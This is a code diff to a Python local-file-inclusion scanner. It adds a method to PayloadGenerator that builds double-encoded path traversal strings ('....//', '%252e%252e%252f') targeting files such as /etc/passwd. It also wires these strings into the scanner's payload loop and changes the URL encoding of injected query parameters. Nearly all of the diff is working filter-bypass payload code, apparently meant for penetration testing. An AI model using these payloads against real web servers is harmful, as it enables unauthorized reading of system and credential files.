@@ -216,6 +216,24 @@ class PayloadGenerator:
         
         return list(variants)
     
+    def generate_double_encoding_variants(self, file_path: str) -> List[str]:
+        variants = set()
+        
+        path = f"....//....//....//....//{file_path}"
+        
+        variants.add(urllib.parse.quote(urllib.parse.quote(path)))
+        variants.add(path.replace("/", "%252f"))
+        variants.add(path.replace(".", "%252e").replace("/", "%252f"))
+        variants.add(f"..%252f..%252f..%252f..%252f{file_path}")
+        variants.add(f"%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{file_path}")
+        
+        encoded_path = urllib.parse.quote(file_path)
+        for traversal in ["..%252f", "%252e%252e%252f", "..%252f..%252f..%252f"]:
+            variants.add(f"{traversal}{encoded_path}")
+            variants.add(f"{traversal}{file_path}")
+        
+        return list(variants)
+    
     def generate_filter_chains(self) -> List[str]:
         chains = []
         for r in range(1, 3):
@@ -233,8 +251,11 @@ class PayloadGenerator:
         
         for file_target in file_targets:
             path_variants = self.generate_path_variants(file_target)
+            double_encoded = self.generate_double_encoding_variants(file_target)
             
-            for path in path_variants:
+            all_paths = set(path_variants + double_encoded)
+            
+            for path in all_paths:
                 yield path
                 
                 yield urllib.parse.quote(path)
@@ -266,6 +287,9 @@ class PayloadGenerator:
         yield "/etc/passwd"
         yield "....//....//....//....//etc/passwd"
         yield "..%252f..%252f..%252f..%252fetc/passwd"
+        yield "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd"
+        yield urllib.parse.quote("....//....//....//....//etc/passwd")
+        yield urllib.parse.quote(urllib.parse.quote("....//....//....//....//etc/passwd"))
 
 
 class ResponseAnalyzer:
@@ -513,7 +537,7 @@ class LFIScanner:
                 query_params = parse_qs(parsed.query)
                 query_params[param] = [payload]
                 
-                new_query = "&".join([f"{k}={urllib.parse.quote(v[0])}" for k, v in query_params.items()])
+                new_query = "&".join([f"{k}={urllib.parse.quote(v[0], safe='')}" for k, v in query_params.items()])
                 full_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
                 
                 response = self.client.get(full_url)
